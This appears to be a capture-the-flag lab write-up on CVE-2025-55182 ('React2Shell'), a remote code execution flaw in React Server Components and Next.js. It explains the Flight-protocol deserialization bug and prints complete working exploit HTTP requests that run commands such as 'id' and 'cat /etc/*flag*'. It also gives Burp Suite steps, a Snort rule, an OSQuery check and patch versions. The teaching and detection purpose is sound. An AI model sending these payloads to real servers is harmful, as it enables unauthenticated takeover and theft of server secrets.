# React2Shell: CVE-2025-55182

Deep dive into the CVE-2025-55182 vulnerability and how it compromises React Server Components.

## **INTRODUCTION**

In this task, we’ll break down **CVE-2025-55182**, one of the most severe vulnerabilities disclosed in December 2025. With a **maximum CVSS score of 10.0**, this flaw compromises React Server Components (RSC) and any framework that relies on them, most notably **Next.js**. Security researchers dubbed it **“React2Shell”**, and for good reason: the bug enables **unauthenticated remote code execution (RCE)** through nothing more than a single crafted HTTP request.

Let dissect the vulnerability from the ground up; how React Server Components work, how the **Flight** protocol serializes and deserializes data, why the underlying design flaw leads to arbitrary code execution, and how attackers can exploit it using a real proof-of-concept. By the end, you’ll understand how a seemingly harmless serialization feature escalates into a full server compromise.

According to the official advisories, the affected versions are:

- **19.0**
- **19.1.0**
- **19.1.1**
- **19.2.0**

And the vulnerable packages include:

- `react-server-dom-webpack`
- `react-server-dom-parcel`
- `react-server-dom-turbopack`

To mitigate the issue, systems must be updated to:

- **19.0.1**
- **19.1.2**
- **19.2.1**

---

## **Understanding React Server Components and the Flight Protocol**

React Server Components (RSC), introduced in React 19, allow components to be rendered on the server instead of the client’s browser. This offloads heavy computation to the server and sends only the rendered output to the client, improving performance and reducing client-side workload.

Communication between the client and server is handled through the **React Flight protocol**, which serializes and deserializes the data exchanged during RSC operations. When the client triggers a Server Action, it sends a structured Flight payload with encoded references that describe which module, function, or value the server should access and execute.

The Flight protocol uses a compact serialization format with type markers such as:

- **`$@`** — chunk reference
- **`$B`** — blob reference
- **Colon syntax** (e.g., `"$1:constructor:constructor"`) — property path traversal

These markers allow the client to reference server-side modules and functions; but this is also where the vulnerability originates.

---

## **The Core Vulnerability: Unsafe Deserialization**

CVE-2025-55182 is fundamentally an **unsafe deserialization vulnerability** in how RSC handles incoming Flight payloads. The flaw is located in the `requireModule` logic inside `react-server-dom-webpack`.

Here’s the offending pattern:

```jsx
function requireModule(metadata) {
  var moduleExports = __webpack_require__(metadata[0]);
  // ... additional logic ...
  return moduleExports[metadata[2]];  // VULNERABLE LINE
}
```

The issue lies in the bracket notation:

`moduleExports[metadata[2]]`.

JavaScript’s property lookup doesn’t restrict access to exported properties—it walks the **entire prototype chain**. Because of this, attackers can reference internal properties that were never meant to be exposed.

This is where things get dangerous.

Every JavaScript function has a `.constructor` property, which points to the global **Function constructor**. The Function constructor can take a string and execute it as JavaScript code effectively acting like `eval`.

With property path syntax, an attacker can request:

```
$1:constructor:constructor

```

This chain resolves to the Function constructor itself, giving the attacker the ability to execute arbitrary server-side JavaScript.

---

## **The Exploitation Chain: From Deserialization to Code Execution**

Maple3142’s proof-of-concept showcases exactly how the vulnerability is weaponized.

### **Stage 1: Building a Fake Chunk Object**

The exploit begins with a crafted multipart form request. One of the fields contains a **fake Flight chunk**, which manipulates the deserialization process and convinces the server to load attacker-controlled metadata.

Once the server processes this fake chunk, it follows the malicious `$1:constructor:constructor` reference. That path leads directly to the Function constructor; and execution of arbitrary JS becomes trivial.

From there, the payload can:

- write files
- spawn a reverse shell
- execute system commands
- pivot to deeper access

At that point, the attacker effectively owns the server.

```json
{
 "then": "$1:__proto__:then",
 "status": "resolved_model",
 "reason": -1,
 "value": "{\\"then\\":\\"$B1337\\"}",
 "_response": {
   "_prefix": "process.mainModule.require('child_process').execSync('xcalc');",
   "_chunks": "$Q2",
   "_formData": {
     "get": "$1:constructor:constructor"
   }
 }
}
```

This object mimics React’s internal `Chunk` class structure. By setting `then` to reference `Chunk.prototype.then`, we’re creating a self-referential structure. When React processes this and awaits the chunk, it invokes the `then` method with the fake chunk as the context (`this`).

**Stage 2: Exploiting the Blob Deserialization Handler**

The second critical component is the `$B` handler reference (`$B1337`). In React’s Flight protocol, the `$B` prefix indicates a Blob reference. When React processes a Blob reference, it calls a function that internally uses `response._formData.get(response._prefix + id)`.

Here’s where the exploitation becomes elegant: we’ve polluted the `_response` object with our malicious properties. When the Blob handler executes:

```jsx
response._formData.get(response._prefix + id)
```

It actually executes:

```jsx
Function("process.mainModule.require('child_process').execSync('xcalc');1337")
```

Let’s break down why: we’ve set `_formData.get` to point to `$1:constructor:constructor`, which resolves to the `Function` constructor. The `_prefix` contains our malicious code. When these are combined, the `Function` constructor is invoked with our code as a string argument, creating and implicitly executing a function containing our arbitrary JavaScript.

**Stage 3: Achieving Code Execution**

The payload `process.mainModule.require('child_process').execSync('xcalc')` demonstrates the power of this exploit. We’re using Node.js’s module system to:

1. Access `process.mainModule` (the main module being executed)
2. Use its `require` method to load the `child_process` module
3. Call `execSync` to execute an operating system command
4. In this case, launching the calculator application (`xcalc`) as proof of exploitation

This could easily be modified to establish a reverse shell, exfiltrate environment variables containing secrets, read sensitive files, or perform any operation the Node.js process has permissions to execute.

### Analysing an Actual Proof-of-Concept

Let’s examine the complete HTTP request from maple3142’s PoC:

```bash

POST / HTTP/1.1Host: localhost  Next-Action: x  Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"process.mainModule.require('child_process').execSync('xcalc');","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

The `Next-Action: x` header triggers React’s Server Action processing. The multipart body contains three parts:

- **Field 0**: The fake chunk object with our malicious `_response` structure
- **Field 1**: A reference `$@0` that points back to field 0, creating the self-reference
- **Field 2**: An empty array, completing the required structure

When the server processes this request, it deserialises field 0, encounters the $@0 reference in field 1, establishes the self-referential then property, and subsequently triggers the Blob handler, which executes our code through the `Function` constructor.

## **Vulnerable Versions and Attack Surface**

CVE-2025-55182 affects React Server Components in the following versions:

- React 19.0.0, 19.1.0, 19.1.1, and 19.2.0
- Next.js versions ≥14.3.0-canary.77, all 15.x, and 16.x releases prior to patching
- Other frameworks using RSC: React Router (RSC mode), Waku, Redwood SDK, and various RSC plugins

The vulnerability is particularly dangerous because:

1. **Default configurations are vulnerable** - A standard Next.js application created with `create-next-app` is exploitable without any code changes
2. **No authentication required** - The attack works without any credentials
3. **High reliability** - Security researchers report near 100% exploitation success rates
4. **Wide deployment** - Wiz Research data shows 39% of cloud environments contain vulnerable instances

According to Shodan, over 571,000 public servers utilise React components, and 444,000 use Next.js. Whilst not all of these are vulnerable versions, the potential attack surface is enormous.

## Exploitation

You can confirm that you can view the app’s home page by visiting http://10.81.140.66:3000. Now, it is time to exploit it. At the time of writing, our preferred choice is a payload that allows us to view the command execution result in the server’s response, as obtained from [here](https://github.com/Malayke/Next.js-RSC-RCE-Scanner-CVE-2025-66478). The exploit code is repeated below for your convenience.

```bash
POST / HTTP/1.1Host: localhost:3000User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0Next-Action: xX-Nextjs-Request-Id: b5dce965Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3SadX-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9Content-Length: 740

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('id',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

As you have learned through the previous tasks, you can spot from `execSync('id'...` that `id` will be executed on the remote server. Moreover, knowing that this payload will return the command output back to us in the server’s response.

## **Sending the Payload via Burp Suite**

After you start Burp Suite, you will need to go to the **Repeater** tab. Then click on the “+” button under **Repeater** and choose **New HTTP tab** as shown in the image below.

![RSC0.png](RSC0.png)

Now paste the payload exactly as provided into the Request tab, just like in the example below.

![RSC1.png](RSC1.png)

"Before sending the payload, you must set the target server. Click *Target: Not specified* and choose the correct endpoint

![RSC2.png](RSC2.png)

**Use the following settings:**

- **Host:** `10.81.140.66`
- **Port:** `3000`
- **Important:** The server does **not** use HTTPS, so leave **Use HTTPS** unchecked.

With the target configured, you can now start firing commands at the vulnerable server and observe the output in the response panel. In the example below, the server returns the result of the `date` command.

![RSC3.png](RSC3.png)

**Challenge** 

**What user is running the vulnerable application?**

`ubuntu`

**What is the flag inside `/etc`?**

The payload below was crafted to execute `cat /etc/*flag*` on the target and return the flag in the server’s error digest:

```bash
POST / HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0
Next-Action: x
X-Nextjs-Request-Id: b5dce965
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9
Content-Length: 753

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('cat /etc/*flag*',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

**Server response:**

```bash
HTTP/1.1 500 Internal Server Error
Vary: rsc, next-router-state-tree, next-router-prefetch, next-router-segment-prefetch, Accept-Encoding
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
x-nextjs-cache: HIT
x-nextjs-prerender: 1
Content-Type: text/x-component
Date: Sat, 06 Dec 2025 14:42:24 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 244

0:{"a":"$@1","f":"","b":"C6iQRLVjXRZ9E0vNosfR3"}
1:E{"digest":"I tried meditating to reduce stress, but all I could think about was whether my state was lifting in React or if Node was silently buffering my stdout.\n\n-> THM{React-19.2.0} <-"}
```

---

### Detection

This section highlights practical approaches for detecting React2Shell / CVE-2025-55182 activity across your network and systems.

This vulnerability requires very specific request structures tied to React Server Components (RSC) and the Flight protocol. Normal user traffic **will not** contain these headers, multipart structures, or the serialized fields required for exploitation.

Indicators that strongly suggest exploitation attempts include:

- A `Next-Action` header.
- `multipart/form-data` requests directed at RSC endpoints.
- Serialized fields with patterns such as `"status": "resolved_model"`.
- Obvious misuse of RSC internal markers; for example, `"then":"$1:__proto__:then"` , which should never appear in normal external requests.

Because of how the exploit works, defenders can reliably detect malicious behavior by monitoring request format and structure, rather than deep-inspecting every field.

---

## **Snort (v3) Rule**

```bash
alert http any any -> $LAN_NETWORK any (
    msg:"Potential Next.js React2Shell / CVE-2025-66478 attempt";
    flow:to_server,established;
    content:"Next-Action"; http_header; nocase;
    content:"multipart/form-data"; http_header; nocase;
    pcre:"/Content-Disposition:\s*form-data;\s*name=\"0\"/s";
    pcre:"/\"status\"\s*:\s*\"resolved_model\"/s";
    pcre:"/\"then\"\s*:\s*\"\$1:__proto__:then\"/s";
    classtype:web-application-attack;
    sid:6655001;
    rev:1;
)
```

**Summary:**

- Flags abnormal headers not generated by legitimate users.
- Detects multipart RSC requests following the exploit’s structure.
- Identifies serialized Flight protocol fields required for the attack.

---

## **OSQuery Detection**

Use the following OSQuery rule to identify vulnerable React Server Component packages in endpoints or build pipelines:

```json
{
  "queries": {
    "detect_rev2shell_react_server_components": {
      "query": "SELECT name, version, path FROM npm_packages WHERE (name='react-server-dom-parcel' AND (version='19.0.0' OR (version >= '19.1.0' AND version < '19.1.2') OR version='19.2.0')) OR (name='react-server-dom-turbopack' AND (version='19.0.0' OR (version >= '19.1.0' AND version < '19.1.2') OR version='19.2.0')) OR (name='react-server-dom-webpack' AND (version='19.0.0' OR (version >= '19.1.0' AND version < '19.1.2') OR version='19.2.0'));",
      "interval": 3600,
      "description": "Detects vulnerable versions of React Server Components packages (react-server-dom-*) affected by CVE-2025-55182 / CVE-2025-66478 / React2Shell.",
      "platform": "linux,windows,macos",
      "version": "1.0"
    }
  }
}

```

**Summary:**

- Identifies vulnerable packages before they reach production.
- Useful across endpoints, CI/CD pipelines, and development environments.

---

### Conclusion

Many PoCs circulating online are misleading and only function because their bundled app is intentionally insecure. Your target here relied on these vulnerable versions:

```json
"dependencies": {
  "next": "16.0.6",
  "pm2": "^6.0.14",
  "react": "19.2.0",
  "react-dom": "19.2.0"
}
```

Once updated (`npm audit` recommendations), the exploit is no longer viable.

Make sure you apply the patched versions in any environment you manage.
